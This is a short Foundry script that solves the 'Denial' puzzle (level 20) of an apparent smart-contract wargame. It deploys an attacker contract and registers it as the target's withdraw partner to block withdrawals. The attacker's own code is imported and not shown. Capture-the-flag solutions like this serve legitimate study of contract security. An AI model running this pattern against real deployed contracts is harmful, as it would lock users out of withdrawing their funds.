// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Denial} from "@puzzles/20/Denial.sol";
import {DenialAttacker} from "@attackers/20/DenialAttacker.sol";

contract DenialSolution is Script {
    function run(address target) external {
        solve(target);
    }

    function solve(address target) public {
        Denial puzzle = Denial(payable(target));

        vm.startBroadcast();
        DenialAttacker attacker = new DenialAttacker(target);
        puzzle.setWithdrawPartner(address(attacker));
        vm.stopBroadcast();
    }
}